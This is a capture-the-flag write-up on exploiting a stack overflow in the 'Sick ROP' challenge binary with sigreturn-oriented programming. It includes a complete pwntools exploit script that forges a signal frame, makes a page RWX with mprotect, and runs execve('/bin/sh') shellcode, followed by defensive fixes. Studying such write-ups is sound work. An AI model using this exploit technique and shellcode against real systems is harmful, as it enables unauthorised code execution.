## Overview

**Sick ROP** is an Easy Pwn challenge built around a minimal, hand-written assembly binary:
statically linked, No-PIE, NX, no stack canary. It has a textbook
[stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html) but is deliberately
starved of ROP gadgets (no `pop rax`, no `pop rdi`) and has **no writable data segment** to
stage a `"/bin/sh"` string. The hint — *"You might need some syscalls"* — points at
**SROP (Sigreturn-Oriented Programming)**: forge a signal frame, let `rt_sigreturn` restore
every register at once, `mprotect` a code page to RWX, then run shellcode.

## The technique

When a process returns from a signal handler the kernel calls `rt_sigreturn` (syscall **15**),
which pops a `struct sigframe` off the stack and **restores every general register, `rip`, and
`rsp` from it**. If an attacker controls the stack at the moment a `syscall` runs with
`rax = 15`, that whole register state is attacker-chosen — a single forged frame becomes an
arbitrary syscall with arbitrary arguments. No gadget chain required, which is exactly what we
need against a gadget-poor binary.

The binary is three tiny functions:

| addr | function | behaviour |
|------|----------|-----------|
| 0x401000 | `read`  | `read(0, [rsp+8], [rsp+0x10])`, then `syscall; ret` (the `syscall` is at **0x401014**) |
| 0x401017 | `write` | `write(1, [rsp+8], [rsp+0x10])` — echoes input |
| 0x40102e | `vuln`  | `read(0, buf[0x20], 0x300)` → **stack overflow**, echoes, `leave; ret` |
| 0x40104f | `_start`| `call vuln; jmp _start` — loops forever |

Four pieces make the exploit work:

1. **Get `rax = 15` with no `pop rax`.** A successful `read()` returns the byte count in
   `rax`. The binary loops `call vuln`, so we re-enter `vuln` and send **exactly 15 bytes** →
   `rax = 15`. When that `vuln` returns, our chain sends it into the bare `syscall; ret` →
   `rt_sigreturn` fires. (Raw 15 bytes — a newline would make it 16.)
2. **`mprotect` a code page RWX.** The forged frame calls `mprotect(0x400000, 0x2000, 7)`. Use
   only the *mapped* pages: `0x2000` covers `0x400000` + `0x401000`; `0x4000` would touch the
   unmapped `0x402000` page and `mprotect` fails entirely with `ENOMEM`.
3. **Pivot back in.** After `mprotect`, the `ret` pops `frame.rsp`, which we set to **0x4010d8**
   — a `.symtab` qword that equals `&vuln`. It is live in memory because the mmap that maps
   `.text` is page-granular, so the symtab bytes on that page come along. Control re-enters
   `vuln` with its read buffer now at **0x4010b8**, inside the freshly RWX page.
4. **Drop + run shellcode.** The final `read` writes an `execve("/bin/sh")` shellcode to
   0x4010b8 and pads so the saved return slot (0x4010e0) becomes `0x4010b8` → `leave; ret`
   jumps into the shellcode.

A subtle but important detail: `vuln` echoes its input, so we `recv()` between every send. That
guarantees each `read()` has already returned — otherwise a single `read(0x300)` would swallow
the next stage.

## Solution

`checksec` and the gadget hunt first:

```bash
checksec --file=sick_rop          # Static, No-PIE, NX enabled, No canary
ROPgadget --binary sick_rop | grep ': syscall'   # 0x401014 : syscall
```

Then the SROP chain. Save as `solve.py`:

```python
#!/usr/bin/env python3
import sys
from pwn import *
context.clear(arch='amd64', os='linux')

syscall      = 0x401014   # syscall ; ret
vuln         = 0x40102e
vuln_ptr     = 0x4010d8   # symtab qword == &vuln (shares the .text mmap page)
shellcode_at = 0x4010b8   # vuln's read buffer after the pivot (RWX)

shellcode = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")

io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process("./sick_rop")

frame = SigreturnFrame()
frame.rax = 10            # SYS_mprotect
frame.rdi = 0x400000      # base
frame.rsi = 0x2000        # only the 2 mapped pages (0x4000 -> ENOMEM)
frame.rdx = 7             # PROT_READ|WRITE|EXEC
frame.rsp = vuln_ptr      # ret after mprotect -> [0x4010d8] = &vuln
frame.rip = syscall       # execute the mprotect syscall

io.send(b'A'*40 + p64(vuln) + p64(syscall) + bytes(frame)); io.recv(timeout=2)
io.send(b'C'*15);                                            io.recv(timeout=2)  # rax=15 -> sigreturn
io.send(shellcode + b'\x90'*(40-len(shellcode)) + p64(shellcode_at)); io.recv(timeout=2)
io.sendline(b'cat flag*; id'); print(io.recvall(timeout=4).decode('latin1'))
```

Run it against the live instance:

```bash
python3 solve.py <target-ip> <port>
# uid=999(ctf) ...
# HTB{...}
```

## Why it worked

The root weakness is a classic
[stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html):
`read(0, buf[0x20], 0x300)` writes far past a 32-byte buffer, overwriting the saved return
address **and** a full forged sigframe behind it. Combined with a reachable `syscall`
instruction and the ability to set `rax = 15` via a syscall's return value, that single
overflow grants total register control — `mprotect` lifts NX off a code page, and the page
becomes the staging ground for shellcode the binary otherwise had nowhere to put.

## Fix / defense

- **Bound the read:** `read(0, buf, sizeof(buf))` — the oversized read into an undersized
  buffer is the entire bug.
- **Stack canary** (`-fstack-protector-strong`) detects the saved-frame overwrite before `ret`.
- **PIE + ASLR** (`-fPIE -pie`) randomises the `syscall` gadget and the pivot pointer, removing
  the fixed addresses SROP relies on.
- **seccomp** forbidding `mprotect`/`execve` stops a forged frame from flipping pages RWX or
  spawning a shell.
